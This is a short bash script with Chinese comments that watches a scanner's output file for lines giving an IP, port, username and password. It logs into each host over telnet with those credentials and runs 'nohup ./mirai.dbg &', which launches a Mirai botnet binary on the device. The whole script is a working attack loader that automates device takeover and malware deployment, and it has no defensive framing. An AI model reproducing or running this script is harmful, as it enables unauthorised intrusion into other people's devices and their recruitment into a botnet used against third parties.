#!/bin/bash

# 检查是否有输出文件作为输入
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <output_file>"
    exit 1
fi

OUTPUT_FILE="$1"

# 使用 tail -F 监视输出文件
tail -F "$OUTPUT_FILE" | while read -r line; do
    # 解析 IP、端口、用户名和密码
    if echo "$line" | grep -qE '([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):([0-9]+) ([^:]+):(.+)'; then
        IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -n 1)
        PORT=$(echo "$line" | grep -oE ':[0-9]+' | head -n 1 | tr -d ':')
	 USERNAME=$(echo "$line" | awk '{print $2}' | cut -d':' -f1)
        PASSWORD=$(echo "$line" | awk '{print $2}' | cut -d':' -f2)
        # 打印解析的信息
        echo "---------------------"
        echo "Parsed Info:"
        echo "IP: $IP"
        echo "Port: $PORT"
        echo "Username: $USERNAME"
        echo "Password: $PASSWORD"


        # 通过 telnet 连接
        {
            sleep 2  # 确保连接成功
            echo "$USERNAME"
            sleep 2
            echo "$PASSWORD"
            sleep 2
	    echo "nohup ./mirai.dbg &"
	    sleep 2
        } | telnet "$IP" "$PORT"
    fi
done
